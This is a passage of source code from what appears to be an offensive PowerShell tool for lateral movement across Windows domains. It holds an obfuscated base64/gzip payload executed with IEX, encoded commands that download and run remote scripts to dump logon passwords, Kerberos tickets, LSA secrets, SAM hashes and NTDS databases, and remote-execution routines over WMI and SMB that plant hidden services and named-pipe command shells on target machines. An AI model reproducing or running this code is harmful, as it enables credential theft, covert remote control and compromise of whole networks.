Function Invoke-Mongoose{$gz="H4sIAAAAAAAEACVQ30vDMBB+F/wfQhhcytqydeqDPlXMRmHK3NrhFCHdzEYh7dSm4iz5373L+pDcfc33426ldB5lVumaCQZrGEK5BDZkDLKUbgFbI2/HiH8lEDCPdK/Y/lIXIOkt33zKd8EY78euHzkeTWEKIXxLoAf46o7hJ+iYaRv9lN+ZStX9XBIoYPyMaknhxeHvxZNYtC7nWMQ8VW2rZL01Jx7zmcxVvlELzYX3u3H9xJHrlesT8u6vHWfRXkBhK1Q1EISQQiggrbFtK+wFxI9lQ3MeNJ61ptrG/k9H5ZHQ0lbHhkBoib46tRZhXZ+HxlwHpe1eVdI8cEFzcHJPKMw5QEkq3hA+SCHDvqnslIwro71O6IdIfPyRn2Pi2biUFSUpLdEroj8dKeai2xq8vOoOV7wLaVuYppUqV7iyQlKaQd+oYm5cOOitWnbSseDy4h/XHGik6QEAAA=="
$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::deCOmPreSs);$c=New-Object System.IO.MemoryStream;$b.COpYTo($c);$d=[System.Text.Encoding]::UTF8.GETSTrIng($c.ToArray());$b.ClOse();$a.ClosE();$c.cLose();$d|IEX}"";Invoke-Mongoose
'@

    ################################################################################################################
    ######################################## Command and Module logic ## ###########################################
    ################################################################################################################

    # Tickets
    if ($Module -eq "Tickets") {
        $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""tickets"""
        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
        $Command = "powershell.exe -ep bypass -enc $base64command"
    }


    # Amnesiac
    if ($Module -eq "Amnesiac") {

        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Amnesiac PID: $Global:AmnesiacPID"

        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "PipeName: $Global:PN"

        if ($Scramble) {

            Write-Host ""
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "The switch Scramble is in use. Ensure Amnesiac is already running"

            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "In Amnesiac do ""GLset $Global:PN"" then hit option ""3"""
    
        }

        $SID = $Global:SID
        $ServerScript = "`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
        $b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))

        # Change the command string if the Method is WinRM
        if ($Method -eq "WinRM") { $finalString = "powershell.exe -EncodedCommand ""$b64ServerScript""" }

        else {
            $finalstring = "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-ep Bypass`", `"-enc $b64ServerScript`""
            $finalstring = $finalstring -replace '"', "'"
        }

        $Command = $finalstring
        Start-sleep -seconds 2
    }

    # Tickets - KerbDump
    if ($Module -eq "KerbDump") {
        $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ;IEX(New-Object System.Net.WebClient).DownloadString(""$KirbyURL"")"
        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
        $Command = "powershell.exe -ep bypass -enc $base64command"
    }

    # LogonPasswords
    elseif ($Module -eq "LogonPasswords") {
        $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""dump"""
        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
        $Command = "powershell.exe -ep bypass -enc $base64command"
    }

    # NTDS
    elseif ($Module -eq "NTDS") {
        $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ; IEX(New-Object System.Net.WebClient).DownloadString(""$NTDSURL"");Invoke-NTDS"
        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
        $Command = "powershell.exe -ep bypass -enc $base64command"
    }

    # eKeys
    elseif ($Module -eq "ekeys") {
        $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""ekeys"""
        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
        $Command = "powershell.exe -ep bypass -enc $base64command"
    }

    # LSA
    elseif ($Module -eq "LSA") {
        $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""LSA"""
        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
        $Command = "powershell.exe -ep bypass -enc $base64command"
    }

    # SAM
    elseif ($Module -eq "SAM") {
        $b64 = "$LocalSAM"
        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
        $Command = "powershell.exe -ep bypass -enc $base64command"
    }

    # Disks
    elseif ($Module -eq "disks") {
        $b64 = 'Get-Volume | Where-Object { $_.DriveLetter -ne "" -and $_.FileSystemLabel -ne "system reserved" } | Select-Object DriveLetter, FileSystemLabel, DriveType, @{Name="Size (GB)";Expression={$_.Size / 1GB -replace "\..*"}} | FL'
        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
        $Command = "powershell.exe -ep bypass -enc $base64command"
        # Set module to "" for modules where we do not wish to save output for
        $Module = ""
    }

    # LoggedOnUsers
    elseif ($Module -eq "LoggedOnUsers") {
        $b64 = "Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName; Write-Host"
        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
        $Command = "powershell.exe -ep bypass -enc $base64command"
        # Set module to "" for modules where we do not wish to save output for
        $Module = ""
    }

    # Sessions
    elseif ($Module -eq "Sessions") {
        $b64 = "Write-host; query user | Out-String"
        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
        $Command = "powershell.exe -ep bypass -enc $base64command"
        # Set module to "" for modules where we do not wish to save output for
        $Module = ""
    }

    # ConsoleHistory
    elseif ($Module -eq "ConsoleHistory") {
        $b64 = "$ConsoleHostHistory"
        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
        $Command = "powershell.exe -ep bypass -enc $base64command"
    }

    # Files
    elseif ($Module -eq "Files") {
        $b64 = "$Files"
        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
        $Command = "powershell.exe -ep bypass -enc $base64command"
    }



    elseif ($Module -eq "" -and $Command -ne "") {
        $base64Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
        $Command = "powershell.exe -ep bypass -enc $base64Command"
    }


    ################################################################################################################
    ################################# Logic to help keep output tidy and even ######################################
    ################################################################################################################

    if ($Method -ne "Spray" -and !$IPAddress) {
        $NameLength = ($computers | ForEach-Object { $_.Properties["dnshostname"][0].Length } | Measure-Object -Maximum).Maximum
        $OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].Length } | Measure-Object -Maximum).Maximum
    }

    elseif ($Method -ne "Spray" -and $IPAddress) {
        $NameLength = 16
        $OSLength = 14
    }

    ################################################################################################################
    ################################################ Function: WMI #################################################
    ################################################################################################################
    Function Method-WMIexec {
        param ($ComputerName)
        Write-host
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList


        $scriptBlock = {
            param ($computerName, $Command, $Username, $Password, $LocalAuth, $Timeout)
    
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            if (!$connected) { return "Unable to connect" }


            # Function to perform WMI operations
            Function WMI {
                param (
                    [string]$ComputerName,
                    [string]$Command = "whoami",
                    [string]$Class = "PMEClass",
                    [switch]$LocalAuth,
                    [string]$Username,
                    [string]$Password
                )

                $WMIAccess = $null

                # Create PSCredential object if using local authentication
                if ($LocalAuth) {
                    $LocalUsername = "$ComputerName\$Username"
                    $LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
                    $cred = New-Object System.Management.Automation.PSCredential($LocalUsername, $LocalPassword)
                }

                # Check for local or non-local authentication
                if ($LocalAuth) { $WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" -Credential $Cred } 
                else { $WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" }

                if (!$WMIAccess) { return "Access Denied" } 
                elseif ($Command -eq "") { return "Successful Connection PME" }

                function CreateScriptInstance {
                    param ([string]$ComputerName)

                    if ($LocalAuth) {
                        if ($LocalAuth) {
                            $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $Cred
                            if ($classCheck -eq $null) {
                                $scope = New-Object System.Management.ManagementScope("\\$ComputerName\root\cimv2", (New-Object System.Management.ConnectionOptions -Property @{ Username = "$Computername\$Username"; Password = $Password }))
                                $scope.Connect()

                                $newClass = New-Object System.Management.ManagementClass($scope, [System.Management.ManagementPath]::DefaultPath, $null)
                                $newClass["__CLASS"] = "$Class"
                                $newClass.Qualifiers.Add("Static", $true)
                                $newClass.Properties.Add("CommandId", [System.Management.CimType]::String, $false)
                                $newClass.Properties["CommandId"].Qualifiers.Add("Key", $true)
                                $newClass.Properties.Add("CommandOutput", [System.Management.CimType]::String, $false)
                                $newClass.Put() | Out-Null
                            }

                            $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $Cred
                            $wmiInstance.GetType() | Out-Null
                            $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
                            $wmiInstance.Dispose()
                            return $commandId
                        }
                    }
                    else {
                        $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
                        if ($classCheck -eq $null) {
                            $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2", [string]::Empty, $null)
                            $newClass["__CLASS"] = "$Class"
                            $newClass.Qualifiers.Add("Static", $true)
                            $newClass.Properties.Add("CommandId", [System.Management.CimType]::String, $false)
                            $newClass.Properties["CommandId"].Qualifiers.Add("Key", $true)
                            $newClass.Properties.Add("CommandOutput", [System.Management.CimType]::String, $false)
                            $newClass.Put() | Out-Null
                        }
                        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName
                        $wmiInstance.GetType() | Out-Null
                        $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
                        $wmiInstance.Dispose()
                        return $commandId
                    }
                }

                # Function to retrieve script output
                function GetScriptOutput {
                    param (
                        [string]$ComputerName,
                        [string]$CommandId
                    )
                    try {
                        if ($LocalAuth) {
                            $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'" -Credential $Cred
                        }
                        else {
                            $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
                        }
                        $result = $wmiInstance.CommandOutput
                        $wmiInstance.Dispose()
                        return $result
                    }
                    catch {
                        Write-Error $_.Exception.Message
                    }
                    finally {
                        if ($wmiInstance) {
                            $wmiInstance.Dispose()
                        }
                    }
                }

                # Function to execute a command remotely
                function ExecCommand {
                    param (
                        [string]$ComputerName,
                        [string]$Command
                    )
                    $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
                    if ($LocalAuth) {
                        $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $Cred
                    }
                    else {
                        $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
                    }
                    if ($process.ReturnValue -eq 0) {
                        $started = Get-Date
                        Do {
                            if ($started.AddMinutes(2) -lt (Get-Date)) {
                                Write-Host "PID: $($process.ProcessId) - Response took too long."
                                break
                            }
                            if ($LocalAuth) {
                                $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" -Credential $Cred
                            }
                            else {
                                $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
                            }
                            Start-Sleep -Seconds 1
                        } While ($watcher -ne $null)
                        $scriptOutput = GetScriptOutput -ComputerName $ComputerName -CommandId $scriptCommandId
                        return $scriptOutput
                    }
                }

                # Main script logic
                $commandString = $Command
                $scriptCommandId = CreateScriptInstance -ComputerName $ComputerName
                if ($scriptCommandId -eq $null) {
                    Write-Error "Error creating remote instance."
                }
                $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
                $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
                $result = ExecCommand -ComputerName $ComputerName -Command $encodedCommand

                # Clean up WMI class instance
                if ($LocalAuth) {
                    $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2" -Credential $Cred
                    Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName -Credential $Cred | Out-Null
                }
                else {
                    $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
                    Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
                }

                return $result
            }

            If ($LocalAuth) { WMI -ComputerName $ComputerName -Command $Command -LocalAuth -Username $Username -Password $Password }
            else { WMI -ComputerName $ComputerName  -Command $Command }


        }

        # Create and invoke runspaces for each computer
        # Filter non-candidate systems before wasting processing power on creating runspaces

        foreach ($computer in $computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }


            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }




        # Poll the runspaces and display results as they complete
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $null
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                    $hasDisplayedResult = $false
                    try { $result = $result.Trim() } catch {}

                    # [other conditions for $result]
                    if ($result -eq "Access Denied") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 
                    elseif ($result -eq "Unspecified Error") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 
                    elseif ($result -eq "Timed Out") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                        continue
                    }
            
                    elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 
                         
                    elseif ($result -eq "Successful Connection PME") {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                    } 
            
                    elseif ($result -eq "Unable to connect") {}

                    elseif ($result -match "[a-zA-Z0-9]") {
                
                        if ($result -eq "No Results") {
                            if ($successOnly) { continue }
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                        } 
                        else {
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                            $filePath = switch ($Module) {
                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                                "KerbDump" { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                                "LSA" { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                                "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                                "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                                "NTDS" { "$NTDS\$($runspace.ComputerName)-NTDS.txt" }
                                default { $null }
                            }

                            if ($filePath) {
                                $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                                if ($ShowOutput) {
                                    $result | Write-Host
                                    Write-Host
                                    $hasDisplayedResult = $true
                                }
                            }

                            # Handle the default case.
                            if (-not $Module -and -not $hasDisplayedResult) {
                                $result | Write-Host
                                Write-Host
                                $hasDisplayedResult = $true
                            }
                        }
                    } 
                    elseif ($result -notmatch "[a-zA-Z0-9]") {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        # Clean up
        $runspacePool.Close()
        $runspacePool.Dispose()



    }

    ################################################################################################################
    ############################################## Function: SMB ################################################
    ################################################################################################################
    Function Method-SMB {

        Write-host

        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param($ComputerName, $Command, $Timeout)
    
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            if (!$connected) { return "Unable to connect" }   
    
            $SMBCheck = $false
            $SMBCheck = Test-Path "\\$ComputerName\c$" -ErrorAction "SilentlyContinue"

            if (!$SMBCheck) {
                return "Access Denied"
            }

            if ([string]::IsNullOrWhiteSpace($Command)) {
                return "Successful connection PME"
            }


    
            function Enter-SMBSession {

                param (
                    [string]$PipeName,
                    [string]$ComputerName,
                    [string]$ServiceName,
                    [string]$Command,
                    [string]$Timeout = "45000"
                )
	
                $ErrorActionPreference = "SilentlyContinue"
                $WarningPreference = "SilentlyContinue"
	
	
                if (-not $ComputerName) {
                    Write-Output " [-] Please specify a Target"
                    return
                }
	
                if (!$PipeName) {
                    $randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % { [char]$_ })
                    $randomvalue = $randomvalue -join ""
                    $PipeName = $randomvalue
                }
	
                if (!$ServiceName) {
                    $randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % { [char]$_ })
                    $randomvalue = $randomvalue -join ""
                    $ServiceName = "Service_" + $randomvalue
                }
	
                $ServerScript = @"
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 1028, 1028, `$null)
`$pipeServer.WaitForConnection()
`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
while (`$true) {
	if (-not `$pipeServer.IsConnected) {
		break
	}
	`$command = `$sr.ReadLine()
	if (`$command -eq "exit") {break} 
	else {
		try{
			`$result = Invoke-Expression `$command | Out-String
			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
		} catch {
			`$errorMessage = `$_.Exception.Message
			`$sw.WriteLine(`$errorMessage)
		}
		`$sw.WriteLine("###END###")
		`$sw.Flush()
	}
}
`$pipeServer.Disconnect()
`$pipeServer.Dispose()
"@
	
                $B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
                $arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
                $startarguments = "\\$ComputerName start $ServiceName"
	
                Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
                Start-Sleep -Milliseconds 2000
                Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	
                # Get the current process ID
                $currentPID = $PID
	
                # Embedded monitoring script
                $monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$ComputerName"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the service
		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		break # Exit the monitoring script
	}
}
"@
	
                $b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
	
                # Execute the embedded monitoring script in a hidden window
                Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden
	
                $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')
	
                try {
                    $pipeClient.Connect($Timeout)
                }
                catch [System.TimeoutException] {
                    return "Timed Out"

                }
                catch {
                    Write-Output "unexpected error"
                    Write-Output ""
                    return
                }

                $sr = New-Object System.IO.StreamReader($pipeClient)
                $sw = New-Object System.IO.StreamWriter($pipeClient)

                $serverOutput = ""
	
                try {
                    if ($Command) {
                        $fullCommand = "$Command 2>&1 | Out-String"
                        $sw.WriteLine($fullCommand)
                        $sw.Flush()
                        while ($true) {
                            $line = $sr.ReadLine()
                            if ($line -eq "###END###") {
                                Write-Output $serverOutput.Trim()
                                Write-Output ""
                                return
                            }
                            else {
                                $serverOutput += "$line`n"
                            }
                        }
                    } 
		
                }
	
                finally {
                    $stoparguments = "\\$ComputerName delete $ServiceName"
                    Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
                    if ($sw) { $sw.Close() }
                    if ($sr) { $sr.Close() }
                }
	
            }
            return Enter-SMBSession -ComputerName $ComputerName -Command $Command
        }


        # Create and invoke runspaces for each computer
        foreach ($computer in $computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }

            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        # Poll the runspaces and display results as they complete
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                    $hasDisplayedResult = $false
                    try { $result = $result.Trim() } catch {}


                    # [other conditions for $result]
                    if ($result -eq "Access Denied") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 
                    elseif ($result -eq "Unexpected Error") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 
            
                    elseif ($result -eq "Timed Out") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                        continue
                    }
            
                    elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 
             
                    elseif ($result -eq "Successful Connection PME") {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                    } 
            
                    elseif ($result -eq "Unable to connect") {}

                    elseif ($result -match "[a-zA-Z0-9]") {
                
                        if ($result -eq "No Results") {
                            if ($successOnly) { continue }
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                        }
                 
                        else {
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                            $filePath = switch ($Module) {
                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                                "KerbDump" { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                                "LSA" { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                                "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                                "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                                "NTDS" { "$NTDS\$($runspace.ComputerName)-NTDS.txt" }
                                default { $null }
                            }

                            if ($filePath) {
                                $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                                if ($ShowOutput) {
                                    $result | Write-Host
                                    Write-Host
                                    $hasDisplayedResult = $true
